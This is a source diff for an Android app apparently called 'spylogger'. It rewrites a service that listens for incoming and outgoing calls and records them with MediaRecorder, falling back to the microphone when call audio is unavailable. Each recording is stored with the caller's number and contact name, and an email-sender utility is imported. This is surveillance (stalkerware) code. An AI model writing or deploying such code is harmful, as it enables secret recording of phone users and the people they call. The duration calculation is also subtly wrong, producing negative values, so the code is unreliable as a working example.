@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.media.MediaRecorder;
 import android.os.Binder;
 import android.os.IBinder;
 import android.telephony.PhoneStateListener;
@@ -12,7 +13,6 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.gmailsender.Utils;
-import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
 import com.gravatasufoca.spylogger.model.Gravacao;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
@@ -21,27 +21,29 @@ import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
 import com.utilidades.gravata.utils.Utilidades;
 
+import java.io.File;
 import java.io.IOException;
 import java.sql.SQLException;
 import java.util.Date;
 
-public class RecordService extends Service{
-
+public class RecordService_olde extends Service{
+	private MediaRecorder recorder;
+	private File callFile;
 	private boolean remetente;
 	private RepositorioGravacao repositorioGravacao;
 	private RepositorioTopico repositorioTopico;
+	private static boolean recording = false;
 	private static MyPhoneStateListener phoneListener;
 	private String INCOMING_CALL_ACTION = "android.intent.action.PHONE_STATE";
 	private String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
 	private String phoneNumber;
-
-	private MediaRecorderHelper mediaRecorderHelper;
+	private Date inicio;
 
 	private final IBinder mBinder = new LocalBinder();
 
 	public class LocalBinder extends Binder {
-		RecordService getService() {
-			return RecordService.this;
+		RecordService_olde getService() {
+			return RecordService_olde.this;
 		}
 	}
 
@@ -49,14 +51,6 @@ public class RecordService extends Service{
 
 		@Override
 		public void onReceive(Context context, Intent intent) {
-
-			if(mediaRecorderHelper==null){
-				try {
-					mediaRecorderHelper=new MediaRecorderHelper(getApplicationContext(),true,0);
-				} catch (IOException e) {
-					e.printStackTrace();
-				}
-			}
 
 			if(phoneListener==null){
 				phoneListener = new MyPhoneStateListener(intent);
@@ -94,21 +88,27 @@ public class RecordService extends Service{
 				// DESLIGUEI
 				Log.d("DEBUG", "IDLE");
 
-				if (mediaRecorderHelper.isRecording()) {
-					mediaRecorderHelper.stop();
+				if (recording) {
+					stopRecording();
+					long secondsBetween =  ((inicio.getTime() - (new Date()).getTime()) / 1000);
+					try {
+						Thread.sleep(1000);
+					} catch (InterruptedException e) {
+					}
 
 					try {
 
 						repositorioGravacao = new RepositorioGravacaoImpl(getApplicationContext());
 						repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());
 
+
 						Gravacao gravacao=new Gravacao();
 						gravacao.setRemetente(remetente);
 						gravacao.setData(new Date());
-						gravacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordFile()));
+						gravacao.setAudio(Utils.getBytes(callFile));
 						gravacao.setNumero(phoneNumber);
 						gravacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
-						gravacao.setDuracao(mediaRecorderHelper.getDuration());
+						gravacao.setDuracao(secondsBetween);
 
 						Topico topico = repositorioTopico.findByName(gravacao.getNome());
 						if (topico == null) {
@@ -121,19 +121,24 @@ public class RecordService extends Service{
 						}
 						gravacao.setTopico(topico);
 						repositorioGravacao.inserir(gravacao);
-					} catch (IOException | SQLException e) {
+					} catch (IOException e) {
+						e.printStackTrace();
+					} catch (SQLException e) {
 						e.printStackTrace();
 					}
+
 
 				}
 
 			}else{
-				if(!mediaRecorderHelper.isRecording()){
+				if(!recording){
 					if(state == TelephonyManager.CALL_STATE_OFFHOOK){
 						// ESTOU LIGANDO
 						Log.d("DEBUG", "OFFHOOK");
 						setRemetente(true);
-
+						/*if (Intent.ACTION_NEW_OUTGOING_CALL.equals(this.intent.getAction())) {
+							setPhoneNumber(this.intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
+					 	}*/
 					}else{
 						// RECEBI
 						Log.d("DEBUG", "RINGING");
@@ -142,11 +147,7 @@ public class RecordService extends Service{
 					}
 
 //					if(!Utils.isInBlackList(context, phoneNumber))
-					try {
-						mediaRecorderHelper.start();
-					} catch (IOException e) {
-						e.printStackTrace();
-					}
+						startRecording();
 				}
 			}
 		}
@@ -155,6 +156,7 @@ public class RecordService extends Service{
 
 	@Override
 	public void onCreate() {
+		// TODO Auto-generated method stub
 		super.onCreate();
 
 		IntentFilter intentToReceiveFilter = new IntentFilter();
@@ -165,6 +167,7 @@ public class RecordService extends Service{
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
+		// TODO Auto-generated method stub
 		//super.onStart(intent, startId);
 
 		Utilidades.verifyPremium(this);
@@ -173,7 +176,66 @@ public class RecordService extends Service{
 
 	@Override
 	public IBinder onBind(Intent arg0) {
+		// TODO Auto-generated method stub
 		return mBinder;
+	}
+
+
+	void startRecording() {
+		try {
+			callFile = File.createTempFile("record", ".mp4", getCacheDir());
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+
+		try {
+			recorder=new MediaRecorder();
+
+			recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+			recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+			recorder.setOutputFile(callFile.getAbsolutePath());
+
+//			if(!Utilidades.isPremium(getApplicationContext())){
+//                recorder.setMaxDuration(30000);
+//            }
+
+			recorder.prepare();
+			recorder.start();
+		} catch ( Exception e) {
+
+			try {
+				recorder=new MediaRecorder();
+
+				recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+				recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+				recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+				recorder.setOutputFile(callFile.getAbsolutePath());
+
+		/*	if(!Utilidades.isPremium(getApplicationContext())){
+				recorder.setMaxDuration(30000);
+			}*/
+
+				recorder.prepare();
+
+				recorder.start();
+			} catch (Exception e1) {
+				e1.printStackTrace();
+			}
+		}
+
+		inicio=new Date();
+		recording = true;
+	}
+
+	void stopRecording() {
+		if(recorder!=null){
+			// Then clean up with when it hangs up:
+			recorder.stop();
+			recorder.release();
+			recorder=null;
+		}
+		recording = false;
 	}
 
 	public void setPhoneNumber(String phoneNumber) {
